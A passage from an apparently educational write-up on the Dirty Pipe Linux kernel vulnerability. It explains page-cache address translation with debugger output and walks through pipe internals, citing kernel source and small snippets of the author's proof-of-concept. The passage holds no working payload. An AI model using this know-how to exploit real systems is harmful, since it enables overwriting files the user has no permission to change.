</code></pre><p>The key to finding the &rsquo;needle in the haystack&rsquo; is another region of the kernel&rsquo;s virtual address space.</p><blockquote><p>The sparse vmemmap uses a virtually mapped memory map to optimize pfn_to_page and page_to_pfn operations. There is a global struct page *vmemmap pointer that points to a virtually contiguous array of struct page objects. A PFN is an index to that array and the offset of the struct page from vmemmap is the PFN of that page. <a href=https://www.kernel.org/doc/html/latest/vm/memory-model.html target=_blank rel=noopener>source</a></p></blockquote><pre tabindex=0><code>========================================================================================================================
      Start addr    |   Offset   |     End addr     |  Size   | VM area description
========================================================================================================================
...
   ffffe90000000000 |  -23    TB | ffffe9ffffffffff |    1 TB | ... unused hole
   ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)
   ffffeb0000000000 |  -21    TB | ffffebffffffffff |    1 TB | ... unused hole
...
</code></pre><p>In the debugger we can confirm that the address of the <code>struct page</code> associated to the <code>struct address_space</code> of the <code>target_file</code> our <code>poc</code> process opened indeed lies within this range.</p><pre tabindex=0><code>struct task_struct at 0xffff888103a71c80
&gt; &#39;pid&#39;: 231
&gt; &#39;comm&#39;: &#34;poc&#34;, &#39;\000&#39; &lt;repeats 12 times&gt;

struct file at 0xffff8881045b0800
&gt; &#39;f_mapping&#39;: 0xffff8881017d9460
&gt; filename: target_file

struct address_space at 0xffff8881017d9460
&gt; &#39;a_ops&#39;: 0xffffffff82226ce0 &lt;ext4_aops&gt;
&gt; &#39;i_pages.xa_head&#39; : 0xffffea0004156880                &lt;- here!
</code></pre><p>The kernel implements the translation of this address into a position in the contiguous mapping of all physical memory using a series of macros that hide behind a call to <a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/mm.h#L1712 target=_blank rel=noopener><code>lowmem_page_address / page_to_virt</code></a>
.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define page_to_virt(x) __va(PFN_PHYS(page_to_pfn(x)))
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=cp>#define page_to_pfn __page_to_pfn
</span></span></span><span class=line><span class=cl><span class=cp></span>        <span class=cp>#define __page_to_pfn(page) (unsigned long)((page) - vmemmap) </span><span class=c1>// (see .config: CONFIG_SPARSEMEM_VMEMMAP=y)
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=cp>#define vmemmap ((struct page *)VMEMMAP_START)
</span></span></span><span class=line><span class=cl><span class=cp></span>                <span class=cp># define VMEMMAP_START      vmemmap_base </span><span class=c1>// (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=cp>#define PFN_PHYS(x) ((phys_addr_t)(x) &lt;&lt; PAGE_SHIFT)
</span></span></span><span class=line><span class=cl><span class=cp></span>        <span class=cp>#define PAGE_SHIFT      12
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=cp>#define __va(x)         ((void *)((unsigned long)(x)+PAGE_OFFSET))
</span></span></span><span class=line><span class=cl><span class=cp></span>        <span class=cp>#define PAGE_OFFSET     ((unsigned long)__PAGE_OFFSET)
</span></span></span><span class=line><span class=cl><span class=cp></span>            <span class=cp>#define __PAGE_OFFSET           page_offset_base </span><span class=c1>// (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y)
</span></span></span></code></pre></div><p>When following the macros, make sure to consider your architecture (e.g., x86) and check for compile time definitions in the <code>.config</code> file of your build (e.g., <code>CONFIG_DYNAMIC_MEMORY_LAYOUT=y</code>). The values of <code>vmemmap_base</code> and <code>page_offset_base</code> are in general effected by <a href=https://en.wikipedia.org/wiki/Address_space_layout_randomization#Kernel_address_space_layout_randomization target=_blank rel=noopener>KASLR</a>
but can be determined at runtime e.g., by using the debugger.</p><p>Equipped with this knowledge, we can <a href=https://github.com/vobst/lkd-cve/blob/main/lkd_scripts_gdb/lkd/structs.py#L158 target=_blank rel=noopener>script the debugger</a>
to do this calculation for us and print the cached data of the file we opened.</p><pre tabindex=0><code>struct page at 0xffffea0004156880
&gt; virtual: 0xffff8881055a2000
&gt; data: b&#39;File owned by root!\n&#39;[...]b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;
</code></pre><p>Inspecting the file permissions confirms that we are indeed not allowed to write to it.</p><p><code>-rw-r--r-- 1 root root 20 May 19 20:15 target_file</code></p><p>Next, we are going to explore the second kernel subsystem involved in the Dirty Pipe vulnerability.</p><h2 id=pipes-general>Pipes (general)</h2><p>Pipes are a unidirectional inter-process communication (IPC) mechanism found in UNIX-like operating systems. In essence, a pipe is a buffer in kernel space that is accessed by processes through file descriptors. Unidirectionality means that there are two types of file descriptors, <em>read</em> and <em>write</em> ones:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=n>pipefds</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nf>pipe</span><span class=p>(</span><span class=n>pipefds</span><span class=p>);</span>
</span></span></code></pre></div><pre tabindex=0><code>                         ┌───────────────────┐
 write() ---&gt; pipefds[1] │&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;│ pipefds[0] ---&gt; read()
                         └───────────────────┘
</code></pre><p>Upon creating a pipe the calling process receives both file descriptors, but usually it proceeds by distributing one or both of the file descriptors to other processes (e.g., by <code>fork/clone</code>ing or through UNIX domain <code>socket</code>s) to facilitate IPC. They are, for example, used by shells to connect stdout and stdin of the launched sub-processes.</p><pre tabindex=0><code>$ strace -f sh -c &#39;echo &#34;Hello world&#34; | wc&#39; 2&gt;&amp;1 | grep -E &#34;(pipe|dup2|close|clone|execve|write|read)&#34;
...
sh: pipe([3, 4]) = 0                              // parent shell creates pipe
sh: clone(...)                                    // spawn child shell that will do echo (build-in command)
sh: close(4) = 0                                  // parent shell does not need writing end anymore
echo sh: close(3)                                 // close reading end
echo sh: dup2(4, 1) = 0                           // set stdout equal to writing end
echo sh: close(4)                                 // close duplicate writing end
echo sh: write(1, &#34;Hello world\n&#34;, 12) = 12       // child shell performs write to pipe
...
sh: clone(...)                                    // spawn child shell that will later execve wc
sh: close(3) = 0                                  // parent shell does not need reading end anymore
...
wc sh: dup2(3, 0) = 0                             // set stdin equal to reading end
wc sh: close(3) = 0                               // close duplicate reading end
wc sh: execve(&#34;/usr/bin/wc&#34;, [&#34;wc&#34;],...)          // exec wc
wc: read(0, &#34;Hello world\n&#34;, 16384) = 12          // wc reads from pipe
...
</code></pre><p>We mostly care about anonymous pipes as seen in the example above but there are also named pipes (see, e.g., <a href=https://www.linuxjournal.com/article/2156 target=_blank rel=noopener>here</a>
)</p><p>Check out the excellent book <em>The Linux Programming Interface</em> by Michael Kerrisk, Chapter 44 &ldquo;Pipes and FIFOs&rdquo; for more information and examples.</p><h2 id=pipes-initialization>Pipes (initialization)</h2><p>After opening the target file, our PoC process proceeds by creating a pipe:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=n>pipefds</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=nf>pause_for_inspection</span><span class=p>(</span><span class=s>&#34;About to create pipe()&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>pipe</span><span class=p>(</span><span class=n>pipefds</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L70 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>Let&rsquo;s investigate what the kernel does to provide the pipe functionality.</p><h3 id=overview>Overview</h3><p>Our system call is handled by the kernel function <code>do_pipe2</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>SYSCALL_DEFINE1</span><span class=p>(</span><span class=n>pipe</span><span class=p>,</span> <span class=kt>int</span> <span class=n>__user</span> <span class=o>*</span><span class=p>,</span> <span class=n>fildes</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nf>do_pipe2</span><span class=p>(</span><span class=n>fildes</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1026 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>do_pipe2</span><span class=p>(</span><span class=kt>int</span> <span class=n>__user</span> <span class=o>*</span><span class=n>fildes</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>file</span> <span class=o>*</span><span class=n>files</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>error</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>error</span> <span class=o>=</span> <span class=nf>__do_pipe_flags</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>files</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>unlikely</span><span class=p>(</span><span class=nf>copy_to_user</span><span class=p>(</span><span class=n>fildes</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>fd</span><span class=p>))))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>fput</span><span class=p>(</span><span class=n>files</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=nf>fput</span><span class=p>(</span><span class=n>files</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=nf>put_unused_fd</span><span class=p>(</span><span class=n>fd</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=nf>put_unused_fd</span><span class=p>(</span><span class=n>fd</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=n>error</span> <span class=o>=</span> <span class=o>-</span><span class=n>EFAULT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>fd_install</span><span class=p>(</span><span class=n>fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>files</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>            <span class=nf>fd_install</span><span class=p>(</span><span class=n>fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>files</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>error</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1004 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>Here we can see that two integer file descriptors, backed by two distinct files, are created. One for the reading <code>fd[0]</code>, and one for the writing <code>fd[1]</code> end of the pipe. The descriptors are also copied from the kernel to user space <code>copy_to_user(fildes, fd, sizeof(fd))</code>, where <code>fildes</code> is the user space pointer we specified with the call to <code>pipe(pipefds)</code> in our PoC.</p><p>Following the call to <code>__do_pipe_flags()</code> reveals which data structures the kernel uses to implement our pipe. We summarized the relevant structures and their relationships in the following figure:</p><pre tabindex=0><code>                                                                                                                  ┌──────────────────┐
                                                                                      ┌──────────────────────┐  ┌►│struct pipe_buffer│
                                   ┌────────────────────────┐                     ┌──►│struct pipe_inode_info│  │ │...               │
                             ┌───► │struct file             │                     │   │                      │  │ │page = Null       │
                             │     │                        │                     │   │...                   │  │ │...               │
File desciptor table         │     │...                     │                     │   │                      │  │ ├──────────────────┤
                             │     │                        │                     │   │head = 0              │  │ │struct pipe_buffer│
int fd    │  struct file *f  │     │f_inode  ───────────────┼──┐                  │   │                      │  │ │...               │
──────────┼───────────────── │     │                        │  │                  │   │tail = 0              │  │ │page = Null       │
...       │  ...             │     │fmode =  O_RDONLY | ... │  │  ┌─────────────┐ │   │                      │  │ │...               │
          │                  │     │                        │  ├─►│struct inode │ │   │ring_size = 16        │  │ ├──────────────────┤
pipefd_r  │  f_read    ──────┘     │...                     │  │  │             │ │   │                      │  │ │       ...        │
          │                        └────────────────────────┘  │  │...          │ │   │...                   │  │ ├──────────────────┤
pipefd_w  │  f_write   ──────┐                                 │  │             │ │   │                      │  │ │struct pipe_buffer│
          │                  │     ┌────────────────────────┐  │  │i_pipe  ─────┼─┘   │bufs ─────────────────┼──┘ │...               │
...       │  ...             └───► │struct file             │  │  │             │     │                      │    │page = Null       │
          │                        │                        │  │  │...          │     │...                   │    │...               │
          │                        │...                     │  │  │             │     └──────────────────────┘    └──────────────────┘
                                   │                        │  │  │i_fop  ──────┼─┐
                                   │f_inode  ───────────────┼──┘  │             │ │   ┌─────────────────────────────────────┐
                                   │                        │     │...          │ └──►│struct file_operations               │
                                   │fmode = O_WRONLY | ...  │     └─────────────┘     │                                     │
                                   │                        │                         │...                                  │
                                   │...                     │                         │                                     │
                                   └────────────────────────┘                         │read_iter  = pipe_read               │
                                                                                      │                                     │
                                                                                      │write_iter = pipe_write              │
                                                                                      │                                     │
                                                                                      │...                                  │
                                                                                      │                                     │
                                                                                      │splice_write = iter_file_splice_write│
                                                                                      │                                     │
                                                                                      │...                                  │
                                                                                      └─────────────────────────────────────┘
</code></pre><p>The two integer file descriptors, representing the pipe in user space, are backed by two <code>struct file</code>s that only differ in their permission bits. In particular, they both refer to the same <code>struct inode</code>.</p><blockquote><p>The inode (index node) is a data structure in a Unix-style file system that describes a file-system object such as a file or a directory. Each inode stores the attributes and disk block locations of the object&rsquo;s data. File-system object attributes may include metadata (times of last change, access, modification), as well as owner and permission data.
[&mldr;]
A directory is a list of inodes with their assigned names. The list includes an entry for itself, its parent, and each of its children. <a href=https://en.wikipedia.org/wiki/Inode target=_blank rel=noopener>source</a></p></blockquote><p>The <code>i_fop</code> field of the inode contains a pointer to a <code>struct file_operations</code>. This structure holds function pointers to the implementations of the various operations that can be performed on the pipe. Importantly, those include the functions the kernel will use to handle a process&rsquo; request to <code>read()</code> or <code>write()</code> the pipe.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>const</span> <span class=k>struct</span> <span class=n>file_operations</span> <span class=n>pipefifo_fops</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>open</span>           <span class=o>=</span> <span class=n>fifo_open</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>llseek</span>         <span class=o>=</span> <span class=n>no_llseek</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>read_iter</span>      <span class=o>=</span> <span class=n>pipe_read</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>write_iter</span>     <span class=o>=</span> <span class=n>pipe_write</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>poll</span>           <span class=o>=</span> <span class=n>pipe_poll</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>unlocked_ioctl</span> <span class=o>=</span> <span class=n>pipe_ioctl</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>release</span>        <span class=o>=</span> <span class=n>pipe_release</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>fasync</span>         <span class=o>=</span> <span class=n>pipe_fasync</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>splice_write</span>   <span class=o>=</span> <span class=n>iter_file_splice_write</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L1218 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>As stated above, an inode is not limited to describing pipes, and for other file types this field would point to another set of function pointers / implementations.</p><p>The pipe-specific part of the inode is mostly contained in the <code>struct pipe_inode_info</code> pointed to by the <code>i_pipe</code> field.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> *    struct pipe_inode_info - a linux kernel pipe
</span></span></span><span class=line><span class=cl><span class=cm> *    @mutex: mutex protecting the whole thing
</span></span></span><span class=line><span class=cl><span class=cm> *    @rd_wait: reader wait point in case of empty pipe
</span></span></span><span class=line><span class=cl><span class=cm> *    @wr_wait: writer wait point in case of full pipe
</span></span></span><span class=line><span class=cl><span class=cm> *    @head: The point of buffer production
</span></span></span><span class=line><span class=cl><span class=cm> *    @tail: The point of buffer consumption
</span></span></span><span class=line><span class=cl><span class=cm> *    @note_loss: The next read() should insert a data-lost message
</span></span></span><span class=line><span class=cl><span class=cm> *    @max_usage: The maximum number of slots that may be used in the ring
</span></span></span><span class=line><span class=cl><span class=cm> *    @ring_size: total number of buffers (should be a power of 2)
</span></span></span><span class=line><span class=cl><span class=cm> *    @nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs
</span></span></span><span class=line><span class=cl><span class=cm> *    @tmp_page: cached released page
</span></span></span><span class=line><span class=cl><span class=cm> *    @readers: number of current readers of this pipe
</span></span></span><span class=line><span class=cl><span class=cm> *    @writers: number of current writers of this pipe
</span></span></span><span class=line><span class=cl><span class=cm> *    @files: number of struct file referring this pipe (protected by -&gt;i_lock)
</span></span></span><span class=line><span class=cl><span class=cm> *    @r_counter: reader counter
</span></span></span><span class=line><span class=cl><span class=cm> *    @w_counter: writer counter
</span></span></span><span class=line><span class=cl><span class=cm> *    @poll_usage: is this pipe used for epoll, which has crazy wakeups?
</span></span></span><span class=line><span class=cl><span class=cm> *    @fasync_readers: reader side fasync
</span></span></span><span class=line><span class=cl><span class=cm> *    @fasync_writers: writer side fasync
</span></span></span><span class=line><span class=cl><span class=cm> *    @bufs: the circular array of pipe buffers
</span></span></span><span class=line><span class=cl><span class=cm> *    @user: the user who created this pipe
</span></span></span><span class=line><span class=cl><span class=cm> *    @watch_queue: If this pipe is a watch_queue, this is the stuff for that
</span></span></span><span class=line><span class=cl><span class=cm> **/</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>pipe_inode_info</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>mutex</span> <span class=n>mutex</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>wait_queue_head_t</span> <span class=n>rd_wait</span><span class=p>,</span> <span class=n>wr_wait</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>head</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>tail</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>max_usage</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>ring_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef CONFIG_WATCH_QUEUE
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=kt>bool</span> <span class=n>note_loss</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>nr_accounted</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>readers</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>writers</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>files</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>r_counter</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>w_counter</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>poll_usage</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>page</span> <span class=o>*</span><span class=n>tmp_page</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>fasync_struct</span> <span class=o>*</span><span class=n>fasync_readers</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>fasync_struct</span> <span class=o>*</span><span class=n>fasync_writers</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>pipe_buffer</span> <span class=o>*</span><span class=n>bufs</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>user_struct</span> <span class=o>*</span><span class=n>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#ifdef CONFIG_WATCH_QUEUE
</span></span></span><span class=line><span class=cl><span class=cp></span>    <span class=k>struct</span> <span class=n>watch_queue</span> <span class=o>*</span><span class=n>watch_queue</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#endif
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>};</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L58 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>At this point we can get a first idea of how pipes are implemented. On a high level, the kernel thinks of a pipe as a circular array of <code>pipe_buffer</code> structures (sometimes also called a ring). The <code>bufs</code> field is a pointer to the start of this array.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> *    struct pipe_buffer - a linux kernel pipe buffer
</span></span></span><span class=line><span class=cl><span class=cm> *    @page: the page containing the data for the pipe buffer
</span></span></span><span class=line><span class=cl><span class=cm> *    @offset: offset of data inside the @page
</span></span></span><span class=line><span class=cl><span class=cm> *    @len: length of data inside the @page
</span></span></span><span class=line><span class=cl><span class=cm> *    @ops: operations associated with this buffer. See @pipe_buf_operations.
</span></span></span><span class=line><span class=cl><span class=cm> *    @flags: pipe buffer flags. See above.
</span></span></span><span class=line><span class=cl><span class=cm> *    @private: private data owned by the ops.
</span></span></span><span class=line><span class=cl><span class=cm> **/</span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>pipe_buffer</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>page</span> <span class=o>*</span><span class=n>page</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>offset</span><span class=p>,</span> <span class=n>len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=k>struct</span> <span class=n>pipe_buf_operations</span> <span class=o>*</span><span class=n>ops</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>;</span>                       
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>private</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/include/linux/pipe_fs_i.h#L26 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>There are two positions in this array: one for writing to (the <code>head</code>) - and one for reading from (the <code>tail</code>) the pipe. The <code>ring_size</code> defaults to <code>16</code> and will always be a power of 2, which is why circularity is implemented by masking index accesses with <code>ring_size - 1</code> (e.g., <code>bufs[head & (ring_size - 1)]</code>). The <code>page</code> field is a pointer to a <code>struct page</code> describing where the actual data held by the <code>pipe_buffer</code> is stored. We will elaborate more on the process of adding and consuming data below. Note that each <code>pipe_buffer</code> has one page associated which means that the total capacity of the pipe is <code>ring_size * 4096 bytes (4KB)</code>.</p><p>A process can get and set the size of this ring using the <code>fcntl()</code> system call with the <code>F_GETPIPE_SZ</code> and <code>F_SETPIPE_SZ</code> flags, respectively. Our PoC sets the size of its pipe to a single buffer (4KB / one page) for simplicity.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>setup_pipe</span><span class=p>(</span><span class=kt>int</span> <span class=n>pipefd_r</span><span class=p>,</span> <span class=kt>int</span> <span class=n>pipefd_w</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>fcntl</span><span class=p>(</span><span class=n>pipefd_w</span><span class=p>,</span> <span class=n>F_SETPIPE_SZ</span><span class=p>,</span> <span class=n>PAGESIZE</span><span class=p>)</span> <span class=o>!=</span> <span class=n>PAGESIZE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L48 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><h3 id=code>Code</h3><p>We can also follow the setup of the pipe in the kernel source code. The initialization of the integer file descriptors happens in <code>__do_pipe_flags()</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>int</span> <span class=nf>__do_pipe_flags</span><span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=n>fd</span><span class=p>,</span> <span class=k>struct</span> <span class=n>file</span> <span class=o>**</span><span class=n>files</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>error</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fdw</span><span class=p>,</span> <span class=n>fdr</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>error</span> <span class=o>=</span> <span class=nf>create_pipe_files</span><span class=p>(</span><span class=n>files</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>fdr</span> <span class=o>=</span> <span class=nf>get_unused_fd_flags</span><span class=p>(</span><span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=n>fdw</span> <span class=o>=</span> <span class=nf>get_unused_fd_flags</span><span class=p>(</span><span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl>    <span class=nf>audit_fd_pair</span><span class=p>(</span><span class=n>fdr</span><span class=p>,</span> <span class=n>fdw</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fd</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>fdr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>fd</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>fdw</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/pipe.c#L954 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>The backing files are initialized in <code>create_pipe_files()</code>. We can see that both files are identical up to permissions, contain a reference to the pipe in their private data, and are opened as <a href=https://elixir.bootlin.com/linux/v5.17.9/source/fs/open.c#L1423 target=_blank rel=noopener>streams</a>
